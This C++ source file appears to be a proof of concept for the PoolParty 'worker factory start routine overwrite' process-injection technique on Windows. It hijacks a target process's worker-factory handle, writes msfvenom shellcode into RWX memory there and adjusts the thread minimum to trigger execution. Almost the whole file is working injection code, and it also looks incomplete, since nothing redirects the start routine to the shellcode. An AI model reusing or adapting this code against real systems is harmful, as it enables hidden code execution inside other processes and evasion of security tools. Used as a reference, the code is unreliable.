/*
* Title: Worker Factory Start Routine Overwrite
* Resources:
*	- https://github.com/SafeBreach-Labs/PoolParty
* Status: Although I have overlooked, it may not work on Windows 11 without error in my experience.
*/
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <vector>
#include "Nt.hpp"

_NtQueryInformationProcess ntQueryInformationProcess = nullptr;
_NtQueryInformationWorkerFactory ntQueryInformationWorkerFactory = nullptr;
_NtQueryObject ntQueryObject = nullptr;
_NtSetInformationWorkerFactory ntSetInformationWorkerFactory = nullptr;

BOOL InitFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) return FALSE;

	ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess)
		return FALSE;
	ntQueryInformationWorkerFactory = reinterpret_cast<_NtQueryInformationWorkerFactory>(GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory"));
	if (!ntQueryInformationWorkerFactory)
		return FALSE;
	ntQueryObject = reinterpret_cast<_NtQueryObject>(GetProcAddress(hNtdll, "NtQueryObject"));
	if (!ntQueryObject)
		return FALSE;
	ntSetInformationWorkerFactory = reinterpret_cast<_NtSetInformationWorkerFactory>(GetProcAddress(hNtdll, "NtSetInformationWorkerFactory"));
	if (!ntSetInformationWorkerFactory)
		return FALSE;

	return TRUE;
}

BOOL GetWorkerFactoryHandle(HANDLE hProcess, HANDLE* hWorkerFactory) {
	std::vector<BYTE> info;
	ULONG infoLength = 0;
	NTSTATUS status;

	do {
		info.resize(infoLength);
		status = ntQueryInformationProcess(hProcess, ProcessHandleInformation, info.data(), infoLength, &infoLength);
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(status))
		return FALSE;

	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pPi = reinterpret_cast<PPROCESS_HANDLE_SNAPSHOT_INFORMATION>(info.data());

	for (int i = 0; i < pPi->NumberOfHandles; i++) {
		if (!DuplicateHandle(
			hProcess,
			pPi->Handles[i].HandleValue,
			GetCurrentProcess(),
			hWorkerFactory,
			WORKER_FACTORY_ALL_ACCESS,
			FALSE,
			0
		)) {
			continue;
		}

		// Get object type information.
		do {
			info.resize(infoLength);
			status = ntQueryObject(*hWorkerFactory, ObjectTypeInformation, info.data(), infoLength, &infoLength);
		} while (status == STATUS_INFO_LENGTH_MISMATCH);

		if (!NT_SUCCESS(status))
			continue;

		PPUBLIC_OBJECT_TYPE_INFORMATION pInfo = reinterpret_cast<PPUBLIC_OBJECT_TYPE_INFORMATION>(info.data());
		if (std::wstring(pInfo->TypeName.Buffer) == L"TpWorkerFactory") {
			return TRUE;
		}
	}

	return FALSE;
}

BOOL WorkerFactoryStartRoutineOverwrite() {
	DWORD dwPid = 5024; // Replace it with the target PID.

	// The shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	if (!InitFunctions()) return FALSE;

	HANDLE hProcess = OpenProcess(
		PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
		FALSE,
		dwPid
	);
	if (!hProcess) return FALSE;

	// Hijack handle.
	HANDLE hWorkerFactory = nullptr;
	if (!GetWorkerFactoryHandle(hProcess, &hWorkerFactory) || !hWorkerFactory) {
		CloseHandle(hProcess);
		return FALSE;
	}

	WORKER_FACTORY_BASIC_INFORMATION wi = { 0 };
	NTSTATUS status = ntQueryInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryBasicInformation,
		&wi,
		sizeof(wi),
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	// Allocate virtual memory.
	LPVOID lpRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpRemoteAddr) {
		CloseHandle(hProcess);
		return FALSE;
	}

	// Write shellcode to the allocated memory.
	if (!WriteProcessMemory(hProcess, lpRemoteAddr, shellcode, sizeof(shellcode), nullptr)) {
		VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return FALSE;
	}

	// Setup execution
	ULONG minThreadNumber = wi.TotalWorkerCount + 1;
	status = ntSetInformationWorkerFactory(
		hWorkerFactory,
		WorkerFactoryThreadMinimum,
		&minThreadNumber,
		sizeof(ULONG)
	);
	if (!NT_SUCCESS(status))
		printf("status: 0x%x\n", status);

	CloseHandle(hProcess);

	return TRUE;
}
